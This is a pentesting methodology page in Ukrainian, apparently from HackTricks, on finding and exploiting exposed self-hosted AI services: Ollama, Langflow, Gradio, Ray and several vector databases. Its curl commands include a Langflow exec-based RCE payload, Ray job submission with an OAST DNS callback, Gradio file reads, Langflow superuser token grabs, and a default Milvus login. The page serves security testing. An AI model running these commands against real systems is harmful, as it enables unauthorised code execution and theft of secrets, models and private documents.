# Відкриті self-hosted AI-сервіси

{{#include ../banners/hacktricks-training.md}}

Команди, які створюють AI-функції, часто запускають власні засоби запуску моделей, конструктори агентів, демоінтерфейси, обчислювальні кластери та векторні бази даних. Багато таких інструментів розроблялися для ноутбука або закритої лабораторної мережі, тому **за замовчуванням не мають автентифікації** або постачаються з увімкненим обхідним механізмом автентифікації. Якщо зловмисник може отримати доступ до такого сервісу, наслідки зазвичай належать до однієї з таких категорій:

- Безкоштовне використання GPU і моделей, а також крадіжка приватних моделей.
- Leak промптів, документів та embeddings.
- Leak секретів із середовища процесу (ключів LLM-провайдерів, cloud-облікових даних).
- Виконання коду, оскільки деякі з цих API запускають код **як функцію**.

На цій сторінці описано, як знаходити такі сервіси та що тестувати для кожного типу API. Про посилення захисту self-hosted inference-сервера та leak через `/slots` у llama.cpp див. [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Про шкідливі файли моделей див. [AI Models RCE](AI-Models-RCE.md).

## Виявлення за сигнатурами

Надсилайте ці запити без облікових даних. JSON-відповідь з очікуваними полями дає змогу визначити продукт, а часто й версію, що підказує, які з наведених нижче перевірок застосовні. Порти відповідають задокументованим значенням за замовчуванням або портам, використаним в офіційних прикладах запуску.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Продукт | Типовий порт | Запит без автентифікації | Ознаки для ідентифікації |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | JSON із версією, список локальних моделей |
| Langflow | 7860 | `GET /api/v1/version` | JSON із версією Langflow |
| Gradio | 7860 | `GET /config` | Конфігурація застосунку з версією Gradio та ID компонентів |
| Панель керування Ray | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, список надісланих завдань |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Значення heartbeat, версія Chroma |
| Qdrant | 6333 | `GET /`, `GET /collections` | Версія Qdrant, список колекцій |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Версія Weaviate, класи |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Список колекцій або помилка автентифікації |

Ці сервіси також часто публікуються за reverse proxy під префіксом шляху (наприклад, `/ollama/` або `/ray/`), тому повторюйте запити з будь-яким префіксом, знайденим у JavaScript-бандлах або документації API.

## API інференсу та керування моделями без автентифікації

Засоби запуску моделей зазвичай надають єдиний REST API, що поєднує маршрути інференсу з адміністративними маршрутами. Ollama — хороший приклад. Вона не має вбудованої автентифікації та за замовчуванням прив'язується до `127.0.0.1:11434`, тоді як `OLLAMA_HOST` змінює адресу прив'язки.<sup>[[1]](#references)[[15]](#references)</sup> В офіційному Docker image задано `OLLAMA_HOST=0.0.0.0:11434` усередині контейнера, оголошено `EXPOSE 11434`, але немає інструкції `USER`, тому сервер у контейнері працює від імені root.<sup>[[16]](#references)</sup> `EXPOSE` не публікує порт на хості, тому доступність із хоста залежить від розгортання. У задокументованих командах `docker run` використовується `-p 11434:11434`, а Docker публікує таке зіставлення на всіх інтерфейсах хоста, якщо не вказано IP хоста.<sup>[[17]](#references)[[18]](#references)</sup>

Що зловмисник отримує через кожну групу маршрутів:<sup>[[2]](#references)</sup>

| Маршрути | Наслідки за відсутності автентифікації |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Список локальних і завантажених моделей, зокрема приватних кастомних моделей |
| `POST /api/show` | Відомості про модель, зокрема Modelfile, шаблон і **system prompt** |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Безкоштовний інференс на обладнанні жертви |
| `POST /api/pull`, `/api/push` | Завантаження моделі сервером з реєстру, обраного зловмисником, або передавання туди моделі |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Створення, перезапис або видалення моделей |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Список моделей, повернений без облікових даних, уже доводить наявність витоку. Користувацькі моделі часто містять внутрішній system prompt, доступний через `/api/show`. Pull на ваш хост доводить, що сервер отримує маніфести з реєстрів, вибраних зловмисником. `/api/push` до вашого реєстру перетворює витік на крадіжку моделі. Не викликайте маршрути створення чи видалення на реальних цілях.

Pull із реєстру також створює поверхню атаки на парсер, оскільки сервер зберігає blobs, використовуючи значення з віддаленого маніфесту. У Probllama (CVE-2024-37032, виправлено в Ollama 0.1.34) значення `digest` маніфесту використовувалося як ім’я файлу без перевірки. Тому зловмисний реєстр міг записувати файли поза каталогом blobs за допомогою послідовностей `../`. Надсилання маніфесту з підставленим digest, що вказував на локальний файл, призводило до витоку цього файлу в реєстр зловмисника. Wiz досягла RCE у Docker, де сервер працює від root, записавши shared library і додавши її до `/etc/ld.so.preload`, а потім викликавши `/api/chat`, щоб новий процес завантажив її.<sup>[[15]](#references)</sup> Якщо runner може виконувати pull із довільних реєстрів, перевірте, як він перетворює поля маніфесту на шляхи.

## API, призначені для виконання коду

### API подання завдань

Фреймворки розподілених обчислень розглядають виконання коду як свою основну функцію. Ray Jobs API на порту dashboard (8265) приймає shell-команду `entrypoint` і виконує її в кластері.<sup>[[19]](#references)</sup> Дослідження Oligo ShadowRay повідомляє, що Jobs API не має авторизації, а dashboard прив’язується до `0.0.0.0`. Застосовність CVE-2023-48022 є спірною, оскільки Ray розрахований на роботу лише в контрольованій мережі.<sup>[[20]](#references)</sup> У версії 2.52.0 Ray додав опціональну автентифікацію за токеном (`RAY_AUTH_MODE=token`). У Ray 2.59 вона ввімкнена за замовчуванням для локальних кластерів, запущених через `ray.init()`; `ray start --head` без доступного токена все ще може запуститися без автентифікації. Ray описує ширше впровадження автентифікації за замовчуванням у версії 2.61, тому перевіряйте розгорнуту версію та спосіб запуску, а не припускайте, що dashboard відкритий.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Дашборди такого типу також мають допоміжні маршрути, які варто перевіряти у старих версіях. До Ray 2.8.1 маршрут `/log_proxy?url=` отримував будь-яку URL-адресу HTTP(S) (SSRF до метаданих хмарних сервісів), а `/api/v0/logs/file` приймав довільний шлях `filename` — обидва без автентифікації.<sup>[[8]](#references)</sup>

### Кінцеві точки «перевірки» коду, які запускають визначення функцій

Конструктори агентів, що приймають власні компоненти Python, іноді «перевіряють» код, розбираючи його за допомогою `ast` і запускаючи лише визначення функцій через `exec()`. Це небезпечно. Python обчислює **декоратори та значення аргументів за замовчуванням під час визначення функції**, тож код, розміщений там, запускається, навіть якщо тіло функції ніколи не виконується. `POST /api/v1/validate/code` у Langflow працював саме так і не вимагав автентифікації до версії 1.3.0 (CVE-2025-3248). Якщо підняти виняток, що містить вивід команди, кінцева точка поверне цей вивід у відповіді:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Перевірте будь-який endpoint, який компілює, лінтує або «перевіряє» код користувача на наявність цього шаблону; для підтвердження надавайте перевагу DNS callback.

### Маршрути автоматичного входу та токенів суперкористувача за замовчуванням

Інструменти для одного користувача часто мають скорочений шлях, який входить у систему як адміністратор для кожного відвідувача. У Langflow, якщо ввімкнено `AUTO_LOGIN`, `GET /api/v1/auto_login` повертає токени суперкористувача за замовчуванням будь-якому запитувачу. Якщо його вимкнено, маршрут відповідає `Auto login is disabled.`.<sup>[[23]](#references)</sup> У Langflow OSS версій від 1.0.0 до 1.10.0 ця функція була ввімкнена за замовчуванням (CVE-2026-9103). Поєднання її з наведеним вище автентифікованим маршрутом перевірки коду знову дає змогу виконувати RCE без автентифікації (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> В офіційних пакетах і Docker-образах поточних релізів автоматичний вхід вимкнено, а для входу потрібен пароль суперкористувача, але у гілках розробки він залишається ввімкненим.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Навіть без виконання коду токен суперкористувача дає доступ до кожного flow і збережених облікових даних провайдера. Перевірку пов’язаної передумови в автоматизованому тестуванні див. у [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## Маршрути обслуговування файлів і RPC у демонстраційних ML-інтерфейсах

Фреймворки для демонстрації ML обслуговують завантажені й згенеровані файли через універсальний маршрут і дозволяють frontend викликати серверні допоміжні функції компонентів. Gradio надає для цього `/config`, `/upload` і `/file=<path>`.<sup>[[5]](#references)</sup> На будь-якому подібному фреймворку варто перевірити два сценарії:

- **Вихід за межі підкаталогу завантаження:** якщо маршрут для файлів лише перевіряє, що шлях починається всередині тимчасової теки, завантажте файл, щоб створити підкаталог, а потім вийдіть із нього за допомогою `../` або `%2e%2e%2f`. У Gradio версій 4.0–4.10 (CVE-2023-51449) була така вразливість.<sup>[[26]](#references)[[27]](#references)</sup> Надсилайте запит за допомогою `curl --path-as-is`, щоб клієнт не нормалізував шлях.
- **Довільний виклик методів:** endpoint, що викликає `getattr(component, fn_name)` із користувацьким введенням, дозволяє атакувальнику викликати внутрішні допоміжні функції. До версії 4.13.0 так працював `/component_server` у Gradio. У версіях 4.3–4.12 `move_resource_to_block_cache` копіював будь-який локальний файл у кеш, звідки його можна було завантажити через `/file=`. У версіях 3.47–3.50.2 інші допоміжні функції давали змогу читати файли й виконувати SSRF із повним читанням відповіді.<sup>[[26]](#references)[[28]](#references)</sup> Виправлений сервер відповідає `Function not found.` для допоміжних функцій, які не позначені як серверні.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

На Hugging Face Spaces секрети Space є змінними середовища, тому `/proc/self/environ` — найцінніший файл. Horizon3 прочитали його за допомогою HTTP-заголовка `Range`.<sup>[[26]](#references)</sup>

## Векторні бази даних, що використовуються в RAG

RAG зберігає фрагменти оригінальних документів, їхні embeddings і метадані у векторній базі даних, а асистент додає найрелевантніші результати до свого prompt. Отже, доступ на читання спричиняє leak **відкритого тексту приватних документів**. Доступ на запис дає змогу зловмиснику додавати фрагменти, які згодом потрапляють у prompts інших користувачів. Це персистентний непрямий prompt injection (див. [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Для векторних баз даних із власним хостингом перевірте, чи налаштована автентифікація, або чи ввімкнено анонімний доступ:

- **Qdrant**: самостійно розгорнуті екземпляри прослуховують усі інтерфейси без автентифікації. Якщо налаштовано, ключ передається в заголовку `api-key` або як `Authorization: Bearer`. Можуть бути доступні ключі лише для читання та ключі для окремих колекцій.<sup>[[11]](#references)</sup>
- **Chroma**: автентифікацію вимкнено за замовчуванням. Для автентифікації за токеном використовується `Authorization` або `X-Chroma-Token`.<sup>[[29]](#references)</sup>
- **Weaviate**: якщо ввімкнено анонімний доступ, запити без облікових даних автентифікуються як `user: anonymous` і отримують усі дозволи цього користувача.<sup>[[30]](#references)</sup>
- **Milvus**: автентифікацію вимкнено, якщо `common.security.authorizationEnabled` не має значення `true`. Коли вона ввімкнена, типовий користувач `root` має пароль `Milvus`, а формат токена — `username:password`.<sup>[[31]](#references)[[14]](#references)</sup>

Відповідь із приватними даними без облікових даних свідчить про витік. Якщо автентифікацію ввімкнено, окремо перевірте, чи не змінено обліковий запис за замовчуванням:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Перевірте, чи містять payload-и текст документів, ідентифікатори користувачів або назви tenant-ів. Щоб продемонструвати доступ на запис без забруднення production-даних, створіть і негайно видаліть порожню колекцію з чіткою назвою — і лише якщо це дозволено в межах scope.

На цих серверах автентифікація також може спрацьовувати запізно. У Python FastAPI-сервері Chroma (версії від 1.0.0 щонайменше до 1.5.8, CVE-2026-45829) маршрут створення колекції створював передану клієнтом функцію embeddings до перевірки автентифікації. Конфігурація з посиланням на контрольовану атакувальником модель Hugging Face із `trust_remote_code: true` виконувала код атакувальника, навіть коли запит відхилявся. Rust frontend не постраждав.<sup>[[32]](#references)</sup> Якщо запит містить конфігурацію моделі або плагіна, перевірте його без облікових даних і відстежуйте вихідний запит до вашого репозиторію моделей.

## References

- [1] [Ollama — поширені запитання](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Документація API Ollama](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Файл README Langflow](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Вихідний код Langflow — кінцеві точки API v1](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Вихідний код Gradio — routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Вихідний код Gradio — http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Вихідний код Ray — job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox — Ray, версії 2.6.3 і 2.8.0](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Вихідний код Chroma — типові налаштування Python-клієнта](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Вихідний код Chroma — маршрути FastAPI-сервера](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant — безпека](https://qdrant.tech/documentation/security/)
- [12] [Специфікація OpenAPI Qdrant](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Специфікація OpenAPI Weaviate](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus — підключення до сервера Milvus](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz — Probllama: вразливість віддаленого виконання коду в Ollama (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Файл Dockerfile Ollama](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Документація Docker для Ollama](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker — публікація та відкриття портів](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [REST API завдань Ray](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo — ShadowRay: перша відома кампанія атак на AI-навантаження, використаних у реальних атаках](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Автентифікація за токеном у Ray](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai — Небезпечно на будь-якій швидкості: зловживання Python Exec для неавтентифікованого RCE у Langflow AI](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Вихідний код Langflow — маршрутизатор входу](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD — CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD — CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai — використання вразливостей читання файлів у Gradio для викрадення секретів із Hugging Face Spaces](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Рекомендація безпеки Gradio GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Коміт із виправлення Gradio для `/component_server`](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook — нативна автентифікація Chroma](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate — автентифікація](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus — автентифікація доступу користувачів](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer — ChromaToast Served Pre-Auth](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
